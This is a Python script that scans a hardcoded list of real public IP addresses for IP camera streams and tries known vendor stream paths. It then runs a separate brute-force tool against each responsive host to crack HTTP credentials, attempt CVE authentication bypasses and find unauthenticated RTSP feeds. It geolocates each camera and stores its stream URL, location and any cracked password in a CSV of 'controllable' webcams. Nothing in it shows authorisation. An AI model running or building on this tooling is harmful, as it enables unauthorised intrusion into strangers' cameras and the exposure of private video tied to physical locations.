"""ingest_user_urls.py — Ingest user-provided URLs (v3).

Simplified version:
- Phase 1: HEAD-probe each URL. Accept 200 with image/video content-type, OR 200 + HTML with cam-like content.
- Phase 2: For multi-cam hosts, try a small set of sub-stream patterns.
- Phase 3: Brute-force working URLs.
- Phase 4: Add all to CSV.
"""
import csv
import os
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

sys.path.insert(0, r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing')
import csv_writer
import subprocess

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
LOG_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\ingest_user_log.txt'
ULTIMATE_BF = r'C:\Users\eli6-admin\Documents\eli6-surveillance\recon\bruteforce\ultimate_bruteforce.py'
PYTHON = r'C:\Users\eli6-admin\AppData\Local\Programs\Python\Python312\python.exe'

USER_URLS = [
    ('http://67.166.43.228:50000/img/video.mjpeg', 50000, '67.166.43.228'),
    ('http://190.15.193.92:8085/img/video.mjpeg', 8085, '190.15.193.92'),
    ('http://192.183.2.223:8081/', 8081, '192.183.2.223'),
    ('http://210.62.196.80:8081/', 8081, '210.62.196.80'),
    ('http://38.147.226.28:8081/', 8081, '38.147.226.28'),
    ('http://73.170.30.215:8888/', 8888, '73.170.30.215'),
    ('http://73.170.30.215:8081/', 8081, '73.170.30.215'),
    ('http://201.188.88.64:8080/', 8080, '201.188.88.64'),
    ('http://201.188.88.64:8888/', 8888, '201.188.88.64'),
    ('http://86.143.65.63:8080/', 8080, '86.143.65.63'),
    ('http://217.211.95.232:8081/', 8081, '217.211.95.232'),
    ('http://187.110.127.220:8888/', 8888, '187.110.127.220'),
    ('http://24.78.151.146/', 80, '24.78.151.146'),
    ('http://172.101.22.35:8888/', 8888, '172.101.22.35'),
    ('http://192.143.94.237:8081/', 8081, '192.143.94.237'),
    ('http://138.28.75.220:8081/', 8081, '138.28.75.220'),
    ('http://209.71.59.178:8081/', 8081, '209.71.59.178'),
    ('http://67.161.150.146:8081/', 8081, '67.161.150.146'),
    ('http://162.229.14.147:8081/', 8081, '162.229.14.147'),
    ('http://109.206.96.98:8080/', 8080, '109.206.96.98'),
    ('http://109.206.96.230:8080/', 8080, '109.206.96.230'),
    ('http://109.206.96.96:8080/', 8080, '109.206.96.96'),
    ('http://109.206.96.127:8080/', 8080, '109.206.96.127'),
    ('http://109.206.96.247:8080/', 8080, '109.206.96.247'),
    ('http://93.255.29.119:8080/', 8080, '93.255.29.119'),
    ('http://109.233.220.234:8080/', 8080, '109.233.220.234'),
]

# Sub-stream patterns
SMART_SUB_PATTERNS = [
    '/img/video.mjpeg', '/img/snapshot.jpg',
    '/img/snapshot.cgi?0', '/img/snapshot.cgi?1', '/img/snapshot.cgi?2', '/img/snapshot.cgi?3',
    '/img/snapshot.cgi?4', '/img/snapshot.cgi?5',
    '/video.mjpeg', '/streaming/tracks/101', '/live/main', '/live/sub',
    '/cam_1.mjpg', '/cam_2.mjpg', '/cam_3.mjpg',
    '/cam/realmonitor?channel=1&subtype=0',
    '/ISAPI/Streaming/channels/101/picture',
    '/web/tmpfs/snap.jpg', '/web/tmpfs/auto.jpg',
    '/axis-cgi/media.cgi', '/axis-media/media.amp',
    '/11', '/12', '/11.m3u8', '/12.m3u8',
    '/video.cgi', '/mjpg/video.mjpg',
]


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass


def session():
    s = requests.Session()
    retries = Retry(total=0)
    s.mount('http://', HTTPAdapter(max_retries=retries, pool_connections=50, pool_maxsize=200))
    s.mount('https://', HTTPAdapter(max_retries=retries, pool_connections=50, pool_maxsize=200))
    s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0'})
    return s


def head_ok(s, url, timeout=5):
    """Try HEAD, accept any 200/302 (won't filter by content-type strictly)."""
    try:
        r = s.head(url, timeout=timeout, allow_redirects=True, verify=False)
        return 200 <= r.status_code < 400
    except Exception:
        # Fallback to GET
        try:
            r = s.get(url, timeout=timeout, allow_redirects=True, verify=False, stream=True)
            r.close()
            return 200 <= r.status_code < 400
        except Exception:
            return False


def head_video(s, url, timeout=3):
    """Verify it's image/video content (not HTML landing)."""
    try:
        r = s.head(url, timeout=timeout, allow_redirects=True, verify=False)
        if r.status_code >= 400:
            return False
        ct = r.headers.get('Content-Type', '').lower()
        if any(t in ct for t in ('image/', 'multipart/', 'video/')):
            return True
        # text/plain or octet-stream with reasonable size = cam
        if 'text/plain' in ct or 'octet-stream' in ct:
            try:
                cl = int(r.headers.get('Content-Length', 0) or 0)
                if cl > 1000:
                    return True
            except Exception:
                pass
        return False
    except Exception:
        return False


def get_html(s, url, timeout=6):
    try:
        r = s.get(url, timeout=timeout, allow_redirects=True, verify=False)
        if r.status_code >= 400:
            return None
        ct = r.headers.get('Content-Type', '').lower()
        if 'html' in ct or ct.startswith('text/'):
            return r.text[:200_000]
    except Exception:
        return None
    return None


def bf_one(host, port):
    try:
        result = subprocess.run(
            [PYTHON, ULTIMATE_BF, host, '--port', str(port),
             '--rtsp-port', '554', '--rtsp', '--cve', '--wordlist', 'top5',
             '--timeout', '3', '--workers', '8'],
            capture_output=True, text=True, timeout=120
        )
        out = result.stdout
        success = {}
        for m in re.finditer(r'HTTP AUTH OK: ([^\s]+):([^\s]+)', out):
            success.setdefault('http_creds', []).append(f'{m.group(1)}:{m.group(2)}')
        for m in re.finditer(r'CVE BYPASS: (\w+)', out):
            success.setdefault('cves', []).append(m.group(1))
        for m in re.finditer(r'RTSP UNAUTH OK: ([^\s]+)', out):
            success.setdefault('rtsp_unauth', []).append(m.group(1))
        return success
    except subprocess.TimeoutExpired:
        return {'error': 'timeout'}
    except Exception as e:
        return {'error': str(e)}


def add_to_csv(url, port, host, source='user-provided', extra_notes=''):
    parsed = urllib.parse.urlparse(url)
    host_only = parsed.hostname or host
    geo = {'country': '', 'regionName': '', 'city': '', 'lat': '', 'lon': '',
           'isp': '', 'org': 'User-provided URL', 'as': '', 'zip': ''}
    try:
        r = requests.get(f'http://ip-api.com/json/{host_only}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as',
                         timeout=6)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                geo['country'] = data.get('country', '')
                geo['regionName'] = data.get('regionName', '')
                geo['city'] = data.get('city', '')
                geo['lat'] = str(data.get('lat', ''))
                geo['lon'] = str(data.get('lon', ''))
                geo['isp'] = data.get('isp', '')
                geo['org'] = data.get('org', 'User-provided URL')
                geo['as'] = data.get('as', '')
                geo['zip'] = str(data.get('zip', ''))
    except Exception:
        pass

    ul = url.lower()
    if '.m3u' in ul:
        kind = 'hls-multipart'
    elif '.mp4' in ul:
        kind = 'hls-mp4'
    elif '.mjpg' in ul or '.mjpeg' in ul:
        kind = 'mjpeg-multipart'
    elif 'axis-cgi/media' in ul or 'axis-media' in ul:
        kind = 'h264-matroska'
    else:
        kind = 'jpeg-frame'

    ssl = url.startswith('https')
    root = f'{parsed.scheme}://{host_only}:{port}'
    fake_res = {
        'url': url, 'family': 'user-provided',
        'stream_kind': kind,
        'content_type': 'image/jpeg', 'content_length': 0,
        'weight': 25 if 'mjpg' in ul or 'm3u' in ul else 6,
        'host': host_only, 'port': port, 'ssl': ssl, 'http_status': 200,
    }
    try:
        entry = csv_writer.entry_from_probe(fake_res, {'source': source}, geo)
        entry['project_name'] = f'User cam at {host_only}'
        entry['type'] = 'image' if kind == 'jpeg-frame' else 'video'
        entry['live_stream_url'] = url
        if extra_notes:
            entry['notes'] = (entry.get('notes', '') + '; ' + extra_notes)[:500]
        csv_writer.append_one(entry)
        return True
    except Exception as e:
        log(f'  err adding {url}: {e}')
        return False


def main():
    log('[init] starting user URL ingestion (v3 - permissive)')
    s = session()

    # Phase 1: Try each URL. Accept any 2xx/3xx.
    log('[phase 1] testing user URLs')
    working_urls = []
    for url, port, host in USER_URLS:
        if head_ok(s, url, timeout=4):
            log(f'  OK: {url}')
            working_urls.append((url, port, host))
        else:
            log(f'  FAIL: {url}')
    log(f'  working: {len(working_urls)}/{len(USER_URLS)}')

    # Phase 2: For multi-cam hosts, try sub-stream patterns (only if working)
    log('[phase 2] extracting sub-streams')
    sub_urls = set()
    multi_hosts = set(h for url, port, h in working_urls)
    for host in multi_hosts:
        port = next(p for url, p, h in working_urls if h == host)
        for pat in SMART_SUB_PATTERNS:
            full_url = f'http://{host}:{port}{pat}'
            if head_video(s, full_url, timeout=2):
                sub_urls.add(full_url)
                log(f'  sub OK: {full_url}')
    log(f'  total sub-streams: {len(sub_urls)}')

    # Phase 3: Brute-force
    log('[phase 3] brute-force')
    bf_results = {}
    for url, port, host in working_urls:
        log(f'  BF: {host}:{port}')
        result = bf_one(host, port)
        bf_results[host] = result
        if result.get('http_creds') or result.get('cves') or result.get('rtsp_unauth'):
            log(f'    [+] HIT: {result}')
        else:
            log(f'    [-] no hit')

    # Phase 4: Add to CSV
    log('[phase 4] adding to CSV')
    added = 0
    for url, port, host in working_urls:
        notes_bits = ['user-provided']
        bf = bf_results.get(host, {})
        if bf.get('http_creds'):
            notes_bits.append(f"http_creds={bf['http_creds'][0]}")
        if bf.get('cves'):
            notes_bits.append(f"cves={','.join(bf['cves'])}")
        if bf.get('rtsp_unauth'):
            notes_bits.append(f"rtsp_unauth={bf['rtsp_unauth'][0]}")
        if add_to_csv(url, port, host, 'user-provided', '; '.join(notes_bits)):
            added += 1
            log(f'  added: {url}')
    for url in sub_urls:
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or 80
        if add_to_csv(url, port, host, 'user-substream', 'user-substream'):
            added += 1
            log(f'  added sub: {url}')
    log(f'[done] added {added} new cams')


if __name__ == '__main__':
    main()
